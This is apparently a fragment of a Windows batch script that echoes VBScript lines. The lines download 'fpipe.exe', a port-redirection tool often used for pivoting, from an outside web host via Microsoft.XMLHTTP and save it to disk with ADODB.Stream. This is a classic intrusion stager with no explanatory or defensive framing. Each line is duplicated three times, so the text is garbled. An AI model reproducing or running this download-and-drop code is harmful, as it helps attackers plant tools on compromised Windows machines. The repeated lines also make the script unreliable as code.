echo Set xPost = CreateObject("Microsoft.XMLHTTP") 
echo xPost.Open "GET","http://www.whhyuan.com/fpipe.exe",0 
echo xPost.Open "GET","http://www.whhyuan.com/fpipe.exe",0 
echo xPost.Open "GET","http://www.whhyuan.com/fpipe.exe",0 
echo xPost.Send() 
echo xPost.Send() 
echo xPost.Send() 
echo Set sGet = CreateObject("ADODB.Stream") 
echo Set sGet = CreateObject("ADODB.Stream") 
echo Set sGet = CreateObject("ADODB.Stream") 
echo sGet.Mode = 3 
echo sGet.Mode = 3 
echo sGet.Mode = 3 
echo sGet.Type = 1 
echo sGet.Type = 1 
echo sGet.Type = 1 
echo sGet.Open() 
echo sGet.Open() 
echo sGet.Open() 
echo sGet.Write(xPost.responseBody) 
echo sGet.Write(xPost.responseBody) 
echo sGet.Write(xPost.responseBody) 
echo sGet.SaveToFile "fpipe.exe",2 
echo sGet.SaveToFile "fpipe.exe",2 
echo sGet.SaveToFile "fpipe.exe",2 
